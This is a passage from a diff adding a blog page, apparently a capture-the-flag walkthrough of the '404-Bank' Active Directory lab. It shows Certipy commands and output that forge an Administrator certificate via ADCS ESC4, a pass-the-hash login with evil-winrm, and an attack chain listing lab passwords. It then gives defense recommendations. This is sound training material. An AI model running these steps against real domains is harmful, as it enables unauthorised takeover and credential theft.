+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'</code></pre>
+
+  <p><strong>Step 3:</strong> Authenticate using the certificate to retrieve the Administrator's NT hash:</p>
+  <pre><code>┌──(kali㉿kali)-[~/hacksmarter_labs/404_Bank]
+└─$ certipy auth -pfx administrator.pfx -dc-ip 10.0.17.242
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@404finance.local'
+[*] Using principal: 'administrator@404finance.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@404finance.local': aad3b435b51404eeaad3b435b51404ee:[REDACTED]</code></pre>
+
+  <h3>Administrator Access</h3>
+  <p>With the NT hash, I performed a Pass-the-Hash attack to gain Administrator access:</p>
+  <pre><code>evil-winrm -i 10.0.17.242 -u administrator -H [REDACTED]</code></pre>
+  <p>Successfully authenticated as Domain Administrator and captured the root flag.</p>
+
+  <h2>Attack Chain Summary</h2>
+  <div class="attack-chain">
+    <pre>Initial Recon (Web + Nmap)
+    ↓
+Username Enumeration (employee names from website)
+    ↓
+Password Discovery (MD5 hash in .exe file)
+    ↓
+karl.hackermann (Password123!!)
+    ↓
+GenericWrite over tom.reboot → Targeted Kerberoasting
+    ↓
+tom.reboot (P@ssw0rd123)
+    ↓
+ForceChangePassword over robert.graef
+    ↓
+robert.graef (Zerotrace123!)
+    ↓
+ForceChangePassword over 3 RDP users + AddMember to RDP group
+    ↓
+Credential hunting via RDP sessions → jan.tresor Recycle Bin
+    ↓
+daniel.hoffmann (RemoteAccess!2024)
+    ↓
+WinRM access + Internal port discovery (5000)
+    ↓
+Ligolo-ng pivot to internal service
+    ↓
+ForceChangePassword over webadmin → Internal admin access
+    ↓
+Password-protected ZIP (cracked with custom wordlist)
+    ↓
+svc.services credentials revealed
+    ↓
+ADCS ESC4 exploitation → Administrator certificate
+    ↓
+Domain Administrator (Pass-the-Hash)</pre>
+  </div>
+
+  <h2>Lessons Learned</h2>
+
+  <ol>
+    <li><strong>OPSEC in Development:</strong> The debug string containing hardcoded credentials in the executable demonstrates poor development practices. Credentials should never be embedded in binaries.</li>
+    <li><strong>ACL Misconfigurations:</strong> The chain of ACL misconfigurations (GenericWrite → ForceChangePassword → WriteAccountRestrictions) demonstrates how seemingly minor permissions can be chained for privilege escalation.</li>
+    <li><strong>Internal Service Exposure:</strong> The internal admin panel on port 5000 was protected only by a single account password, and that account was vulnerable to password reset via ACL abuse.</li>
+    <li><strong>ADCS Security:</strong> Certificate template permissions must be carefully managed. ESC4 demonstrates how write access to certificate templates can lead to complete domain compromise.</li>
+    <li><strong>Custom Wordlist Generation:</strong> When standard wordlists fail, context-specific wordlists generated from the target environment (using tools like CeWL) can be highly effective.</li>
+    <li><strong>Defense Recommendations:</strong>
+      <ul>
+        <li>Audit and restrict ACL permissions across AD objects</li>
+        <li>Implement certificate template hardening</li>
+        <li>Remove debug code and credentials from production binaries</li>
+        <li>Segment network access to internal administrative interfaces</li>
+        <li>Monitor for unusual certificate requests and ACL modifications</li>
+        <li>Implement MFA for privileged accounts</li>
+      </ul>
+    </li>
+  </ol>
+
+  <h2>Tools Used</h2>
+  <ul class="tools-grid">
+    <li><strong><a href="https://nmap.org/" target="_blank" rel="noopener">Nmap</a></strong> - Network scanning</li>
+    <li><strong><a href="https://github.com/urbanadventurer/username-anarchy" target="_blank" rel="noopener">username-anarchy</a></strong> - Username list generation</li>
+    <li><strong><a href="https://hashcat.net/" target="_blank" rel="noopener">Hashcat</a></strong> - Password hash cracking</li>
+    <li><strong><a href="https://github.com/ropnop/kerbrute" target="_blank" rel="noopener">Kerbrute</a></strong> - Kerberos username enumeration</li>
+    <li><strong><a href="https://github.com/Pennyw0rth/NetExec" target="_blank" rel="noopener">NetExec</a></strong> - Network execution and AD enumeration</li>
+    <li><strong><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a></strong> - Active Directory attack path mapping</li>
+    <li><strong><a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank" rel="noopener">targetedKerberoast</a></strong> - Targeted Kerberoasting attacks</li>
+    <li><strong><a href="https://github.com/CravateRouge/bloodyAD" target="_blank" rel="noopener">bloodyAD</a></strong> - Active Directory privilege escalation</li>
+    <li><strong><a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">Evil-WinRM</a></strong> - WinRM shell</li>
+    <li><strong><a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener">Ligolo-ng</a></strong> - Tunneling and pivoting</li>
+    <li><strong><a href="https://github.com/digininja/CeWL" target="_blank" rel="noopener">CeWL</a></strong> - Custom wordlist generation</li>
+    <li><strong><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy</a></strong> - ADCS exploitation</li>
+  </ul>
+
+  <h2>Conclusion</h2>
+  <p>The 404-Bank machine provided an excellent demonstration of modern Active Directory exploitation techniques. The attack chain required:</p>
+  <ul>
+    <li>Thorough enumeration and OSINT collection</li>
+    <li>Understanding of Active Directory ACL abuse techniques</li>
+    <li>Creative credential harvesting from non-traditional sources</li>
+    <li>Knowledge of ADCS architecture and exploitation</li>
+    <li>Pivoting skills to access internal-only services</li>
+  </ul>
+
+  <p>This machine serves as a valuable training ground for both offensive and defensive security professionals, showcasing realistic AD misconfigurations and the importance of proper security governance in Windows environments.</p>
+
+  <p><em>This walkthrough is for educational purposes only. Always obtain proper authorization before testing security controls.</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
